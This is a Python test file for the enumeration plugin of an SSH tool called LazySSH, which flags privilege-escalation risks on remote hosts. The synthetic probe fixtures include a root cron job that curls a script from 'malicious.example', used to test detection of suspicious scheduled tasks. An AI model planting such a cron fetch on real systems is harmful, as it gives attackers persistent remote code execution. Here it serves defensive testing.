from datetime import UTC, datetime

from lazyssh.plugins import enumerate as enumerate_plugin


def _probe(category: str, key: str, stdout: str, status: int = 0) -> enumerate_plugin.ProbeOutput:
    return enumerate_plugin.ProbeOutput(
        category=category,
        key=key,
        command="<test>",
        timeout=5,
        status=status,
        stdout=stdout,
        stderr="",
        encoding="base64",
    )


def test_priority_findings_and_json_payload() -> None:
    probes: dict[str, dict[str, enumerate_plugin.ProbeOutput]] = {
        "system": {
            "kernel": _probe("system", "kernel", "5.10.100-custom"),
        },
        "users": {
            "id": _probe(
                "users",
                "id",
                "uid=1000(sam) gid=1000(sam) groups=1000(sam),10(wheel),27(sudo)",
            ),
            "sudo_check": _probe(
                "users",
                "sudo_check",
                "User sam may run the following commands on host:\n    (root) NOPASSWD: /bin/systemctl\n",
            ),
            "sudoers": _probe(
                "users",
                "sudoers",
                "sam ALL=(ALL) NOPASSWD: ALL\n",
            ),
        },
        "filesystem": {
            "suid_files": _probe(
                "filesystem",
                "suid_files",
                "/usr/bin/sudo\n/usr/bin/passwd\n",
            ),
            "sgid_files": _probe(
                "filesystem",
                "sgid_files",
                "/usr/bin/locate\n",
            ),
            "world_writable_dirs": _probe(
                "filesystem",
                "world_writable_dirs",
                "/opt/shared\n/var/www/html\n",
            ),
        },
        "network": {
            "listening_services": _probe(
                "network",
                "listening_services",
                'tcp    LISTEN 0      128    0.0.0.0:80      0.0.0.0:*     users:(("nginx",pid=42,fd=6))',
            ),
        },
        "security": {
            "ssh_config": _probe(
                "security",
                "ssh_config",
                "PermitRootLogin yes\nPasswordAuthentication yes\n",
            ),
        },
        "scheduled": {
            "cron_system": _probe(
                "scheduled",
                "cron_system",
                "* * * * * root curl http://malicious.example/run.sh\n",
            ),
        },
        "packages": {
            "package_inventory": _probe(
                "packages",
                "package_inventory",
                "linux-image-5.10.90\nbash\ncoreutils\n",
            ),
            "package_manager": _probe("packages", "package_manager", "dpkg"),
        },
    }

    snapshot = enumerate_plugin.EnumerationSnapshot(
        collected_at=datetime.now(UTC),
        probes=probes,
        warnings=[],
    )

    findings = enumerate_plugin.generate_priority_findings(snapshot)

    expected_keys = {
        "sudo_membership",
        "passwordless_sudo",
        "suid_binaries",
        "world_writable_dirs",
        "exposed_network_services",
        "weak_ssh_configuration",
        "suspicious_scheduled_tasks",
        "kernel_drift",
    }
    assert {finding.key for finding in findings} == expected_keys

    plain_report = enumerate_plugin.render_plain(snapshot, findings)
    assert "LazySSH Enumeration Summary" in plain_report
    assert "PermitRootLogin yes" in plain_report

    json_payload = enumerate_plugin.build_json_payload(snapshot, findings, plain_report)
    assert json_payload["probe_count"] == sum(len(group) for group in probes.values())
    assert len(json_payload["priority_findings"]) == len(expected_keys)
    assert json_payload["categories"]["users"]["id"]["stdout"].startswith("uid=1000")
    assert (
        "summary_text" in json_payload
        and "LazySSH Enumeration Summary" in json_payload["summary_text"]
    )


def test_render_plain_includes_warnings() -> None:
    snapshot = enumerate_plugin.EnumerationSnapshot(
        collected_at=datetime.now(UTC),
        probes={
            "system": {"os_release": _probe("system", "os_release", "NAME=TestOS")},
        },
        warnings=["Remote stderr: timeout exceeded"],
    )
    findings: list[enumerate_plugin.PriorityFinding] = []

    report = enumerate_plugin.render_plain(snapshot, findings)
    assert "Warnings:" in report
    assert "timeout exceeded" in report
